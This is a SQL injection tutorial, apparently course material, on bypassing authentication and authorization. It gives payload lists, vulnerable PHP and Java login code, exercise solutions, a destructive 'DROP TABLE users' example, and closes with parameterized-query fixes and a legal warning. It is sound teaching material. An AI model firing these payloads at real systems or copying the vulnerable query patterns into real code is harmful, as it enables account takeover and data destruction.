# Subverting Application Logic

SQL injection can be used to bypass authentication and authorization mechanisms by manipulating the logic of SQL queries.

## Authentication Bypass

The most common application logic attack is bypassing login forms.

### Standard Login Query

```sql
SELECT * FROM users WHERE username = 'INPUT_USERNAME' AND password = 'INPUT_PASSWORD'
```

**How it works:**
- User enters username and password
- Query checks if a user exists with both values
- If a row is returned ‚Üí login successful
- If no row is returned ‚Üí login failed

## The Attack

### Classic Authentication Bypass

**Payload in username field:**
```
administrator'--
```

**Password field:**
```
(anything or leave empty)
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

**What happens:**
- `administrator'` closes the username string
- `--` comments out the rest of the query
- Password check is completely removed
- Query returns the administrator user
- **Login successful without knowing the password!**

## Common Variations

### Username Field Payloads

```sql
admin'--
admin'#
admin'/*
administrator'--
' OR '1'='1'--
' OR 1=1--
admin' OR '1'='1
' OR 'x'='x'--
```

### Both Fields Payloads

**Username:**
```sql
admin
```

**Password:**
```sql
' OR '1'='1'--
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'--'
```

**This works because:**
- `AND` is evaluated before `OR`
- So it becomes: `(username = 'admin' AND password = '') OR '1'='1'`
- The OR makes the entire condition TRUE

## Real-World Examples

### Example 1: Admin Panel Login

**URL:** `https://company.com/admin/login`

**Vulnerable Code (PHP):**
```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if(mysqli_num_rows($result) > 0) {
    $_SESSION['logged_in'] = true;
    $_SESSION['user'] = $username;
    header('Location: dashboard.php');
}
```

**Attack:**
- Username: `admin'--`
- Password: (empty)

**Result:** Logged in as admin without password!

### Example 2: Bank Application

**Vulnerable Query:**
```sql
SELECT account_id, balance FROM accounts 
WHERE user_id = 'USER_INPUT' AND pin = 'PIN_INPUT'
```

**Attack:**
```
User ID: 123456' OR '1'='1'--
PIN: (anything)
```

**Impact:** Access to all accounts in the database

### Example 3: Email Verification

**Vulnerable Query:**
```sql
SELECT * FROM users 
WHERE email = 'USER_INPUT' AND verification_code = 'CODE_INPUT'
```

**Attack:**
```
Email: user@example.com'--
Code: (anything)
```

**Impact:** Email verified without valid code

## Advanced Logic Subversion

### Bypassing Multi-Factor Authentication

**Vulnerable Query:**
```sql
SELECT * FROM users 
WHERE username = 'INPUT' 
AND password = 'INPUT' 
AND totp_code = 'INPUT'
```

**Attack:**
```
Username: admin'--
Password: (empty)
TOTP Code: (empty)
```

**Result:** Bypasses password AND 2FA!

### Privilege Escalation

**Vulnerable Query:**
```sql
SELECT * FROM users 
WHERE username = 'INPUT' 
AND role = 'user'
```

**Attack:**
```
Username: attacker' OR role='admin'--
```

**Resulting Query:**
```sql
SELECT * FROM users 
WHERE username = 'attacker' OR role='admin'--' AND role = 'user'
```

**Result:** Returns admin users, escalating privileges

### Session Hijacking

**Vulnerable Query:**
```sql
SELECT session_id FROM sessions 
WHERE user_id = 'INPUT' 
AND ip_address = 'USER_IP'
```

**Attack:**
```
User ID: ' OR '1'='1'--
```

**Result:** Returns all active sessions

## Database-Specific Techniques

### MySQL

```sql
-- Comment variations
admin'#
admin'-- 
admin'/*comment*/

-- Multiple statement execution (sometimes possible)
admin'; DROP TABLE users--
```

### PostgreSQL

```sql
-- Standard comment
admin'--

-- Boolean logic
admin' OR true--
```

### MSSQL

```sql
-- Comment
admin'--

-- Batched queries
admin'; UPDATE users SET role='admin' WHERE username='attacker'--
```

### Oracle

```sql
-- Comment
admin'--

-- Must often include FROM dual
admin' OR 1=1--
```

## Step-by-Step Attack Process

### Phase 1: Detection

**Test for SQL injection:**
```
Username: admin'
Password: test

Look for:
- SQL error messages
- Different behavior
- Delayed response
```

### Phase 2: Identify Comment Syntax

Try different comment styles:
```
admin'--
admin'#
admin'/*
```

### Phase 3: Bypass Authentication

**Successful payload:**
```
Username: admin'--
Password: (empty)
```

### Phase 4: Privilege Escalation (If Needed)

```
Username: ' OR role='admin'--
Password: (empty)
```

## Complete Attack Examples

### Example 1: WordPress-like CMS

**Login Form:**
```html
<form method="POST">
    <input name="username">
    <input name="password" type="password">
    <button>Login</button>
</form>
```

**Vulnerable Backend:**
```php
$user = $_POST['username'];
$pass = md5($_POST['password']);

$query = "SELECT * FROM wp_users WHERE user_login = '$user' AND user_pass = '$pass'";
```

**Attack:**
```
Username: admin'--
Password: (anything - it gets hashed but doesn't matter)
```

**Why it works:**
```sql
SELECT * FROM wp_users WHERE user_login = 'admin'--' AND user_pass = 'hash...'
```
The password check is commented out!

### Example 2: Enterprise Application

**Vulnerable Code (Java):**
```java
String username = request.getParameter("username");
String password = request.getParameter("password");

String query = "SELECT * FROM employees WHERE username = '" + username + 
               "' AND password = '" + password + "' AND status = 'active'";

ResultSet rs = statement.executeQuery(query);

if(rs.next()) {
    session.setAttribute("user", username);
    response.sendRedirect("dashboard.jsp");
}
```

**Attack:**
```
Username: ceo'--
Password: (empty)
```

**Result:** Logged in as CEO, bypassing password and active status check

## Logic Flaws Beyond Authentication

### Authorization Bypass

**Vulnerable Query:**
```sql
SELECT * FROM documents 
WHERE id = 'DOC_ID' 
AND owner = 'CURRENT_USER'
```

**Attack:**
```
Document ID: 123' OR '1'='1'--
```

**Result:** Access to all documents, not just owned ones

### Rate Limiting Bypass

**Vulnerable Query:**
```sql
SELECT COUNT(*) FROM login_attempts 
WHERE username = 'INPUT' 
AND timestamp > NOW() - INTERVAL 1 HOUR
```

**Attack:**
```
Username: nonexistent' AND '1'='2'--
```

**Result:** Query returns 0, bypassing rate limit

### Password Reset Bypass

**Vulnerable Query:**
```sql
SELECT * FROM users 
WHERE email = 'INPUT' 
AND reset_token = 'INPUT'
```

**Attack:**
```
Email: victim@example.com'--
Token: (random string)
```

**Result:** Password reset without valid token

## Impact Assessment

### What Can Be Achieved?

1. **Complete authentication bypass**
2. **Privilege escalation** (user ‚Üí admin)
3. **Account takeover** (any user account)
4. **Authorization bypass** (access restricted resources)
5. **Multi-factor authentication bypass**
6. **Session hijacking**

### Business Impact

- **Total system compromise**
- **Data breach** (access to all accounts)
- **Financial fraud** (if payment systems accessible)
- **Regulatory violations** (GDPR, HIPAA, PCI-DSS)
- **Reputation damage**
- **Legal liability**

## Prevention

### ‚ùå Vulnerable Code Examples

**PHP:**
```php
$query = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

**Python:**
```python
query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pwd}'"
```

**Node.js:**
```javascript
query = `SELECT * FROM users WHERE username = '${user}' AND password = '${pwd}'`;
```

### ‚úÖ Secure Code Examples

**PHP (Prepared Statements):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

**Python (Parameterized):**
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

**Node.js (Parameterized):**
```javascript
connection.query('SELECT * FROM users WHERE username = ? AND password = ?', 
    [username, password], (error, results) => {
    // Handle results
});
```

**Java (PreparedStatement):**
```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

### Additional Security Measures

1. **Hash passwords** (never store plaintext)
2. **Use strong password hashing** (bcrypt, Argon2)
3. **Implement rate limiting**
4. **Add CAPTCHA** after failed attempts
5. **Enable audit logging**
6. **Implement MFA** (properly!)
7. **Use ORM frameworks** (when properly configured)
8. **Input validation** (defense in depth)

## Testing Checklist

- [ ] Test single quote in username: `admin'`
- [ ] Test comment in username: `admin'--`
- [ ] Test OR condition: `' OR '1'='1'--`
- [ ] Test in password field: `' OR 1=1--`
- [ ] Test URL encoding: `admin%27--`
- [ ] Test different comment styles: `--`, `#`, `/**/`
- [ ] Check for error messages revealing DB type
- [ ] Test with actual admin username if known
- [ ] Try privilege escalation payloads
- [ ] Test multi-step authentication

## Real-World Case Studies

### Case 1: Government Portal (2019)
- **Vulnerability:** Authentication bypass
- **Payload:** `admin'--`
- **Impact:** Access to 500,000+ citizen records
- **Outcome:** Responsible disclosure, $5,000 bounty

### Case 2: Banking Application (2020)
- **Vulnerability:** Login bypass + privilege escalation
- **Payload:** `' OR role='admin'--`
- **Impact:** Admin access to customer accounts
- **Outcome:** Critical severity, emergency patch

### Case 3: E-learning Platform (2021)
- **Vulnerability:** Student portal authentication bypass
- **Payload:** `student'--`
- **Impact:** Access to exam questions and answers
- **Outcome:** Platform shutdown, major refactoring

## Key Takeaways

1. **Comments remove restrictions** - Password checks can be bypassed
2. **OR 1=1 works universally** - Doesn't require knowing usernames
3. **Simple payloads, massive impact** - Just `'--` can be devastating
4. **Not just login forms** - Any query with user input is vulnerable
5. **Parameterized queries prevent this** - 100% effective when used correctly
6. **Defense in depth** - Combine multiple security measures

## Practice Exercises

### Exercise 1: Basic Bypass
Login form with username/password.

**Objective:** Bypass authentication

**Solution:** Username: `admin'--`, Password: (empty)

### Exercise 2: Unknown Username
You don't know any valid usernames.

**Objective:** Login anyway

**Solution:** Username: `' OR '1'='1'--`, Password: (empty)

### Exercise 3: Privilege Escalation
You have a regular user account.

**Objective:** Access admin panel

**Solution:** Username: `' OR role='admin'--`

## Next Steps

- Master [UNION Attacks](union-attacks.md)
- Learn [Examining Databases](examining-database.md)
- Study [Blind SQL Injection](../03-blind-sqli/)

---

**‚ö†Ô∏è CRITICAL WARNING:**

Authentication bypass is one of the most serious vulnerabilities. **NEVER** attempt this on systems you don't own or have explicit written permission to test.

**Legal consequences can include:**
- Criminal charges (Computer Fraud and Abuse Act)
- Civil lawsuits
- Imprisonment
- Massive fines

**Only test on:**
- Your own systems
- Authorized penetration tests
- Bug bounty programs (within scope)
- Intentionally vulnerable apps (DVWA, WebGoat)

---

**Remember: Great power, great responsibility!** üîê
